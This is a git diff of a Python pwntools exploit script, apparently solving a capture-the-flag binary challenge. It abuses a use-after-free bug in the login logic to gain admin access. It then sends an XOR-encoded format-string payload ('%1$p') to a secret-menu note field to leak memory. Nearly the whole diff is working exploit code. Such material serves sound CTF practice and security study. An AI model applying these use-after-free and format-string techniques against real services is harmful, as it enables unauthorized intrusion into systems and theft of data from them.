@@ -16,6 +16,17 @@ def get_secret_menu(p):
 
     p.sendlineafter("option: ", "3")
 
+def xor_payload(payload):
+
+    arr = [] 
+
+    for char in payload:
+
+        arr.append(chr(ord(char) ^ 0xf))
+
+
+    return "".join(arr)
+
 def main():
 
     HOST = ""
@@ -33,8 +44,16 @@ def main():
     #======== STEP 1 ===========
     #getting admin access by abusing UAF bug 
     login(p, "A" * 8 + "IS_ADMIN", 16)
-    gdb.attach(p)
-    p.interactive()
+    logout(p)
+    login(p, "A" * 8, 8)
+    get_secret_menu(p)
+    
+    payload = "%1$p"
+    xored_payload = xor_payload(payload)
+    p.sendlineafter("note: ", xored_payload)
+    p.recvline()
+    data = p.recv()
+    print(data)
 
 if __name__ == "__main__":
 
